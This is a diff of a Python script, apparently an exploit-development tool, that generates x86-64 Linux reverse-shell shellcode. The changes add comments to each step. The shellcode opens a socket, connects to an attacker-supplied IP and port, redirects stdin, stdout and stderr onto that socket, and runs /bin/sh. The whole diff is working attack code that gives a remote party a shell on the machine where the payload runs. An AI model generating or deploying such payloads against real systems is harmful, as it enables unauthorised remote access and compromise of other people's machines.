@@ -3,6 +3,10 @@ import struct
 import random
 import argparse
 
+# Set a dictionary with all the register
+registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
+
+
 # Set all register to 0 
 def setRegToZero(reg):
     chunk = bytearray()
@@ -248,46 +252,59 @@ def main():
     ip = int.from_bytes(ip)
     port = int.from_bytes(port)
 
-    # Set a dictionary with all the register
-    registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
-    # the order works for : push FB, pop FB
+
+    
     syscall = bytearray([0x0f,0x05])
-    shellcode = bytearray()
-    shellcode += movValueToReg("rdi",0x02)
-    shellcode += movValueToReg("rsi",0x01)
-    shellcode += setRegToZero("rdx")
-    shellcode += movValueToReg("rax",0x29)
-    shellcode += syscall # socket
-    shellcode += movRegtoReg("rax","rdi")
+
+
 
     # Generate the shellcode with all the fonctions and switch case
     # sub something to rsp
-    shellcode += movValueToReg("rax",0x0002)
+
+    shellcode = bytearray()
+
+    shellcode += movValueToReg("rdi",0x02) # Socket ARG0 : 2 = AF_INET
+    shellcode += movValueToReg("rsi",0x01) # Socket ARG1 : 1 = SOCK_STREAM
+    shellcode += setRegToZero("rdx") # SOCKET ARG2 ; 0 = IPPROTO_IP
+    shellcode += movValueToReg("rax",0x29) # Socket syscall Number
+    shellcode += syscall # socket
+    shellcode += movRegtoReg("rax","rdi") # Save Socket Number to RDI (Connect ARG0)
+
+    
+    # Putting the Sockaddr Struct in memory 
+    shellcode += movValueToReg("rax",0x0002) #  WORD AF_INET
     shellcode += movWORDToMemory(0,"rax")
-    shellcode +=movValueToReg("rax",port) #0x5100
+    shellcode +=movValueToReg("rax",port) # WORD PORT
     shellcode += movWORDToMemory(2,"rax")
-    shellcode +=movValueToReg("rax",ip) #0x0100007f
+    shellcode +=movValueToReg("rax",ip) # DWORD in_addr
     shellcode += movDWORDToMemory(4,"rax")
-    shellcode += setRegToZero("rax")
+    shellcode += setRegToZero("rax") # QWORD Padding
     shellcode += movQWORDToMemory(8,"rax")
-    shellcode += movRegtoReg("rsp","rsi")
-    shellcode += movValueToReg("rdx",0x10)
-    shellcode += movValueToReg("rax",0x2a)
+
+    shellcode += movRegtoReg("rsp","rsi") # Connect ARG1 : ptr* to Sockaddr Struct
+    shellcode += movValueToReg("rdx",0x10) # Connect ARG2 : Sockaddr_size
+    shellcode += movValueToReg("rax",0x2a) # Connect syscall number
     shellcode += syscall # connect
-    shellcode  += setRegToZero("rsi")
-    shellcode += movValueToReg("rax",0x21)
+
+    shellcode  += setRegToZero("rsi") # Dup2 ARG1 : newfd(0=STDIN)
+    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
     shellcode += syscall # dup2
-    shellcode += movValueToReg("rsi",0x01)
-    shellcode += movValueToReg("rax",0x21)
+
+    shellcode += movValueToReg("rsi",0x01) # Dup2 ARG1 : newfd(1=STDOUT)
+    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
     shellcode += syscall # dup2
-    shellcode += movValueToReg("rsi",0x02)
-    shellcode += movValueToReg("rax",0x21)
+
+    shellcode += movValueToReg("rsi",0x02) # Dup2 ARG1 : newfd(2=STDERR)
+    shellcode += movValueToReg("rax",0x21) # Dup2 syscall number
     shellcode += syscall # dup2
-    shellcode += preciseMovToMemory(b'/bin/sh\x00')
-    shellcode += movRegtoReg("rsp","rdi")
-    shellcode += setRegToZero("rsi")
-    shellcode += setRegToZero("rdx")
-    shellcode += movValueToReg("rax",0x3b)  
+
+
+    
+    shellcode += preciseMovToMemory(b'/bin/sh\x00') # Putting /bin/sh string in memory
+    shellcode += movRegtoReg("rsp","rdi") # execve ARG0 : Ptr* to command
+    shellcode += setRegToZero("rsi") # execve ARG1 : Args
+    shellcode += setRegToZero("rdx") # execve ARG2 : Env
+    shellcode += movValueToReg("rax",0x3b) # execve syscall number
     shellcode += syscall # execve
 
     # Format output
